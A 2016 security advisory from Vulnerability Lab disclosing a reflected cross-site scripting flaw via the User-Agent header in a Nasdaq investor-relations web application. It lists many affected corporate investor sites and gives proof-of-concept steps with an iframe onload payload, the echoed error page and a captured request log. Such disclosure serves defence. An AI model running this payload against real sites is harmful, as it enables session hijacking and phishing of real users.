
Date: Fri, 19 Feb 2016 12:41:04 +0100
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Investors Application - Client Side Cross Site Scripting
 Vulnerability

Document Title:
===============
Investors Application - Client Side Cross Site Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1540

Facebook Security ID: 246414938


Release Date:
=============
2016-02-12


Vulnerability Laboratory ID (VL-ID):
====================================
1540


Common Vulnerability Scoring System:
====================================
3.4


Product & Service Introduction:
===============================
Investor Relations Solutions - Designed for companies of all sizes and at every stage of the IPO process, our full suite of solutions delivers 
time saving tools and an integrated IR workflow. As an IR professional, you realize that staying ahead means you need to simultaneously gather 
intelligence on your current and potential shareholders, the dynamics of your sector and the markets at large while optimizing your outreach 
and communications strategy. Nasdaq Corporate Solutions offers the most comprehensive suite of content, analytics, advisory services and 
communications tools to help you maximize the value of your IR program. As a user of Nasdaq Corporate Solutions’ IR Desktop you have access 
to a targeting workflow designed to help you gather intelligence, understand the factors that drive your stock and focus your efforts on the 
investors that truly matter.

(Copy of the Homepage: http://business.nasdaq.com/intel/ir-management/index.html )


Abstract Advisory Information:
==============================
The Vulnerability Laboratory Research Team discovered a client-side cross site scripting web vulnerability in the official Shareholder Investor Relations  web-application. (2015-Q2)


Vulnerability Disclosure Timeline:
==================================
2016-02-12: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
ShareHolder
Product: Investor Relations Solutions - Online Service (Web-Application) 2015 Q2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A client-side cross site scripting web vulnerability has been discovered in the official Shareholder Investor Relations  web-application. (2015-Q2).
The vulnerability allows remote attackers to manipulate client-side application requests to compromise user account session information.

The vulnerability is located in the browser name http request. Remote attackers are able to manipulate the local user agent name value. After the first 
manipulation the attacker requests the investor web-application with the wrong credentials to provoke a client-side script code execution. The user agent 
information are not correctly parsed or encoded which results in the client-side exploitation of the vulnerability.

The security risk of the cross site web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.4. 
Exploitation of the cross site scripting web vulnerability requires no privilege web application user account and no user interaction. 
Successful exploitation results in client-side account theft by hijacking, client-side phishing, client-side external redirects and 
non-persistent manipulation of affected or connected service modules.

Request Method(s):
							[+] GET
							
Vulnerable Module(s):
							[+] Results
							
Vulnerable File(s):
							[+] results.cfm

Vulnerable Parameter(s):
							[+] UserAgent (Client Name Value)


Vulnerable Service(s):
							[+] https://investor.twitterinc.com/events.cfm
							[+] investor.ebayinc.com/
							[+] http://investor.apple.com/results.cfm
							[+] https://investor.yahoo.net/releasedetail.cfm
							[+] http://investors.redhat.com/
							[+] http://www.intc.com/alerts.cfm
							[+] http://investor.zynga.com/
							[+] https://investor.verisign.com/
							[+] http://investor.qualcomm.com/events.cfm
							[+] http://investor.nvidia.com/results.cfm
							[+] http://investor.avinc.com/
							[+] http://investor.frontier.com/events.cfm
							[+] http://investor.ea.com/events.cfm?list=Featured,Future,Past
							[+] http://www.symrise.com/investors/
							[+] http://investor.broadcom.com/directors.cfm
							[+] http://investor.fortinet.com/events.cfm
							[+] http://investor.kodak.com/events.cfm
							[+] http://investor.netgear.com/releasedetail.cfm
							[+] http://investor.compuware.com/releasedetail.cfm
							[+] http://investor.broadcom.com/releases.cfm
							[+] http://www.thyssenkrupp.com/en/investor/
							[+] https://corporate.xing.com/english/investor-relations/
							[+] https://investor.amgfunds.com/home
							[+] http://investor.tiffany.com/annuals.cfm


Proof of Concept (PoC):
=======================
The vulnerability can be exploited by remote attackers withour privilege application user account and with low or medium user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the vulnerability ...
1. Open the link http://investor.fb.com/results.cfm?Quarter=2&Year=a
2. With tamper data in the request GET change the value of User-Agent to User-Agent[Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0<iframe src=x onload=alert('Xss_By_Samir')>
Note: To change the client details to a payload you can also use the firefox addon `user agent switcher`


PoC: XSS investor Facebook
<cfoutput>
Element RESULT.RECORDCOUNT is undefined in RESULTS. <br>The error occurred on line 49.
Date/Time: Tue Jun 30 01:42:44 EDT 2015<br>
Browser: Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0<iframe src="x" onload="alert('Xss_By_Samir')"><br>
Remote Address: 192.168.149.88<br>
<!--- removed query string from error page - info sec viewed it as XSS - tws - 05/18/2010 --->
</cfoutput>


--- PoC Session Logs [GET] ---
GET http://investor.fb.com/results.cfm?Quarter=2&Year=a 
Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] 
Content Size[-1] Mime Type[text/html]
   Request Headers:
      Host[investor.fb.com]
      User-Agent[Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0<iframe src=x onload=alert('Xss_By_Samir')>]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Accept-Language[en-US,en;q=0.5]
      Accept-Encoding[gzip, deflate]
      Cookie[s_fid=03F48D6ED8CA933E-339AB2CC98F957CB; s_nr=1434283797152; s_vnum=1436875513272%26vn%3D5; AMDA45NJ5DZ_SESSION=285430219%7C%20%7Bts%20%272015%2D06%2D14%2009%3A48%3A22%27%7D%7C%20%7Bts%20%272015%2D06%2D30%2001%3A19%3A35%27%7D%7C214C9B1448A1C9480707ADD61138BDAC; 
	  AMDA45NJ5DZ_BRIEFCASE=UPDATED%7C42169%2E3915972; _ga=GA1.2.1177113910.1434286822; s_cc=true; s_invisit=true; gpv_p14=earnings%20-%20facebook; s_sq=%5B%5BB%5D%5D]
      X-Forwarded-For[8.8.8.8]
      Connection[keep-alive]
   Response Headers:
      Server[Microsoft-IIS/6.0]
      X-Powered-By[ASP.NET]
      server-error[true]
      Content-Type[text/html;charset=UTF-8]
      Date[Tue, 30 Jun 2015 05:34:49 GMT]
      Transfer-Encoding[chunked]
      Connection[keep-alive, Transfer-Encoding]
	  

Reference(s):
http://investor.fb.com/
http://investor.fb.com/results.cfm
http://investor.fb.com/results.cfm?Quarter=2&Year=a 


Solution - Fix & Patch:
=======================
The client-side cross site scripting web vulnerability can be patched by a secure parse and encode of the vulnerable client agent name value. 
Encode the input and parse the output to prevent further client-side script code injection attacks via GET method. 


Security Risk:
==============
The security risk of the remote cross site scripting web vulnerability in the investor web-application is estimated as medium. (CVSS 3.4)


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Hadji Samir [s-dz@...mail.fr]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed 
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable 
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab 
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for 
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses, 
policies, deface websites, hack into databases or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       		- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 	       		- admin@...lution-sec.com
Section:    magazine.vulnerability-db.com	- vulnerability-lab.com/contact.php		       	- evolution-sec.com/contact
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       		- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   		- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  	- vulnerability-lab.com/list-of-bug-bounty-programs.php	- vulnerability-lab.com/register/

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to 
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website 
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact 
(admin@...nerability-lab.com or research@...nerability-lab.com) to get a permission.

				Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


